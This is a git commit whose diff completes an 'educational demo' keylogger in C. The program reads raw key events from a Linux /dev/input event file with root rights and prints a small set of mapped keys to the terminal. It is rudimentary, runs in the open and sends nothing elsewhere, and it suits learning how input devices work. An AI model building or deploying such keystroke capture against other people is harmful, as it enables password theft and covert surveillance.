82a34c2cc8d5a107032446d336656f182a90f54e
Cementarii <nikomir32@gmail.com>
2026-02-02 18:53:35 +0100

    Finished proof of concept of keylogger

--- educational-demos/keylogger/keylogger.c
+++ educational-demos/keylogger/keylogger.c
@@ -2,24 +2,75 @@
 
 use the keyboard event file in /dev/
 take argument
+
 we cannot use fopen or fread to read events because of blocking behavior
 use sys functions provided by kernel to read keyboard events (documentation for system functions are found in man 2), check man syscalls
+
+Buffer to allocate is the input_event struct in header linux/input.h https://stackoverflow.com/questions/21204798/read-in-linux-for-event-file
+
 open() returns int file descriptor
+
+https://www.kernel.org/doc/html/v5.4/input/event-codes.html
+
+must flush stream to avoid buffering, use fflush()
 
 */
 
 #include <stdio.h>
 #include <fcntl.h>
 #include <unistd.h>
+#include <linux/input.h>
 
 int main(int argc, char *argv[]) {
     if (argc != 2) {
-        printf("Eventfile argument required");
+        fprintf(stderr, "Eventfile argument required\n");
         return 1;
     }
 
+    struct input_event ie;
+
     int fd = open(argv[1], O_RDONLY, 0);
 
+    if (fd < 0) {
+        fprintf(stderr, "Must run with root privileges\n");
+        return 1;
+    }
 
-    close(fd);
+    for (;;) {
+        read(fd, &ie, sizeof(ie));
+        if (ie.type != EV_KEY)
+            continue;
+        if (ie.value != 1)
+            continue;
+
+        if (ie.code >= 2 && ie.code <= 10) {
+            printf("%d", ie.code - 1);
+        } else if (ie.code == 11) {
+            printf("0");
+        } else {
+            switch (ie.code) {
+                case KEY_Q:
+                    printf("q"); break;
+                case KEY_W:
+                    printf("w"); break;
+                case KEY_E:
+                    printf("e"); break;
+                case KEY_R:
+                    printf("r"); break;
+                case KEY_T:
+                    printf("t"); break;
+                case KEY_Y:
+                    printf("y"); break;
+                case KEY_SPACE:
+                    printf(" "); break;
+                case KEY_BACKSPACE:
+                    printf("(backspace)"); break;
+                case KEY_CAPSLOCK:
+                    printf("(capslock)"); break;
+                default:
+                    printf("Unknown key: %d\n", ie.code);
+            }
+        }
+        fflush(stdout);
+    }
 }
